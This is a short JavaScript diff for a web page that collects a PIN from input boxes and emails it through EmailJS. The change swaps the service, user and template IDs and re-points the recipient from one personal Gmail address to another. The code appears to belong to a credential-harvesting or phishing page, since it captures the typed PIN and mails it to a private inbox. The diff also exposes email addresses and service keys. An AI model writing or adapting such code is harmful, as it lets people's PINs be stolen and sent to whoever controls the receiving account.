@@ -1,7 +1,6 @@
-const serviceId = "service_6f9ye1j";
-const userId = "VsmpKU41MY1gVHquF";
-const templateId = "template_tqztt3k";
-
+const serviceId = "service_umtm03b";
+const userId = "K11nz8wu55BgPl4DY";
+const templateId = "template_km1fgyr";
 // Add event listeners to move the cursor to the next input field
 var pinInputs = document.getElementsByClassName("pin-input");
 
@@ -33,7 +32,7 @@ document
     console.log(pin);
     event.preventDefault();
     const emailParams = {
-      to_name: "Victorchinemerem191@gmail.com",
+      to_name: "backendapp7@gmail.com",
       pin: pin,
     };
     console.log(emailParams);
